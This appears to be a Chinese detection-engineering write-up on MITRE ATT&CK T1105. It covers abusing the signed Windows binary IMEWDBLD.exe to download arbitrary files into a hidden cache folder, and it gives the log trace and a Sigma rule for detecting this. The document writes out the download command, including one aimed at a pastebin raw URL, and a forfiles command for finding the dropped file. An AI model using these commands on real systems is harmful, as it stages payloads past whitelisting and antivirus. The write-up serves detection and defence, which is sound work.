# T1105-win-入口工具转移-IMEWDBLD.exe(白名单)

## 来自ATT&CK的描述

攻击者可能会将工具或其他文件从外部系统转移到被攻击的环境中。可以通过命令和控制通道从外部攻击者控制的系统复制文件，用以将工具带入被攻击的网络中，或通过其他工具（如 FTP）的替代协议。 也可以使用 scp、rsync 和 sftp等本地工具在Mac和 Linux上复制文件。

## 测试案例
IMEWDBLD.exe是微软拼音的开放扩展字典模块，主要用来下载字典文件，在Windows中主要存在路径为：

**路径:**
```
-   C:\Windows\System32\IME\SHARED\IMEWDBLD.exe
```
可以通过`C:\Windows\System32\IME\SHARED\IMEWDBLD.exe <URL>`进行下载任意文件，但是下载的路径为隐藏的文件/文件夹

并且路径为`C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache\IE\[随机值]`;

所以其利用方式是
```
C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw
```

用例：从 Internet 下载文件
所需权限：用户
操作系统：Windows 10

查找下载文件路径：
```
forfiles /P "%localappdata%\Microsoft\Windows\INetCache" /S /M * /C "cmd /c echo @path"

> 参数介绍 
/P 表示开始搜索的路径。默认文件夹是当前工作的 目录 (.)。 
/S 指导forfiles递归到子目录。像"DIR /S"。
/M 根据搜索掩码搜索文件。默认搜索掩码是 '*'。 
/C 表示为每个文件执行的命令。命令字符串应该用双引号括起来。 
@path返回文件的完整路径
```

## 检测日志

windows安全日志

## 测试复现

```bash
C:\Users\liyang>C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://dldir1.qq.com/qqfile/qq/PCQQ9.5.9/QQ9.5.9.28650.exe

C:\Users\liyang>forfiles /P "%localappdata%\Microsoft\Windows\INetCache" /S /M * /C "cmd /c echo @path"

"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\Content.IE5"
"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE"
"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\Low"
"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\Virtualized"
"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\container.dat"
"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236"
"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\JKCC1BIU"
"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236\DisabledFlights[1].cache"
"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236\dyntelconfig[2].cache"
"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236\RemoteSettings_Installer[1].cache"
"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236\ShippedFlights[1].cache"
"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236\tdyShwLw[1].txt"
"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236\views[1]"
"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\EG7SF236\windows-app-web-link[1].json"
"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\JKCC1BIU\QQ9.5.9.28650[1].exe" #文件已经被下载成功
"C:\Users\liyang\AppData\Local\Microsoft\Windows\INetCache\IE\JKCC1BIU\views[1]"
```

当执行下载任务时，Windows弹窗提示失败，忽略即可。实际上文件已经下载到本地目录中。
## 测试留痕
```yml
已创建新进程。

  

创建者主题:

安全 ID: DESKTOP-PT656L6\liyang

帐户名: liyang

帐户域: DESKTOP-PT656L6

登录 ID: 0x47126

  

目标主题:

安全 ID: NULL SID

帐户名: -

帐户域: -

登录 ID: 0x0

  

进程信息:

新进程 ID: 0x2278

新进程名称: C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE

令牌提升类型: %%1938

强制性标签: Mandatory Label\Medium Mandatory Level

创建者进程 ID: 0x1ca8

创建者进程名称: C:\Windows\System32\cmd.exe

进程命令行: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe  https://dldir1.qq.com/qqfile/qq/PCQQ9.5.9/QQ9.5.9.28650.exe
```

## 检测方法/思路
### Sigma规则
```yml
title: IMEWDBLD白名单利用监测
status: experimental
date: 2022/04/20
author: 12306Br0
tags:
- attack.command_and_control
- attack.t1105
references:
- https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/
- https://cloud.tencent.com/developer/article/1848645

logsource:
product: windows
category: security
selection:
   Image: C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE
   CommandLine:http*//
condition: selection
falsepositives:
- Unknown
level: medium
```

## 参考推荐

MITRE-ATT&CK-T1105

<https://attack.mitre.org/techniques/T1105>

IMEWDBLD.exe

<https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/>

IMEWDBLD.exe ByPass360 下载文件

<https://cloud.tencent.com/developer/article/1848645>